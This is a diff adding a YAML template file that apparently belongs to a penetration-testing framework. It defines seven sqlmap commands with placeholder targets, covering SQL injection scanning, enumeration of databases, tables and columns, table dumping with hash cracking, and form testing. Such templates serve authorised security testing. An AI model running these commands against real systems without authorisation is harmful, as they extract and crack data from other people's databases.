@@ -1,0 +1,57 @@
+---
+name: sqlmap
+description: Automatic SQL injection and database takeover tool
+os: Linux
+ptf_module: modules/exploitation/sqlmap
+---
+commands:
+  - "Basic Scan":
+    - type: ["bash","standalone"]
+    - text: "sqlmap -u '{WEBURL}'"
+    - input: ["target URL, including parameters"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Identify Available Databases":
+    - type: ["bash","standalone"]
+    - text: "sqlmap -u '{WEBURL}' --dbs"
+    - input: ["target URL, including parameters"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Identify Tables Available in the Database":
+    - type: ["bash","standalone"]
+    - text: "sqlmap -u '{WEBURL}' -D {STR} --tables"
+    - input: ["target URL, including parameters","target database name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Identify Columns Available in a Table":
+    - type: ["bash","standalone"]
+    - text: "sqlmap -u '{WEBURL}' -D {STR} -T {STR} --columns"
+    - input: ["target URL, including parameters","target database name","target table name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Dump a Table from a Database":
+    - type: ["bash","standalone"]
+    - text: "sqlmap -u '{WEBURL}' -D {STR} -T {STR} --dump"
+    - input: ["target URL, including parameters","target database name","target table name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Dump a Table from a Database and Crack Hashes":
+    - type: ["bash","standalone"]
+    - text: "sqlmap -u '{WEBURL}' -D {STR} -T {STR} --dump --batch"
+    - input: ["target URL, including parameters","target database name","target table name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Parse and Test an Application's Forms":
+    - type: ["bash","standalone"]
+    - text: "sqlmap --forms -u '{WEBURL}'"
+    - input: ["target application URL"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
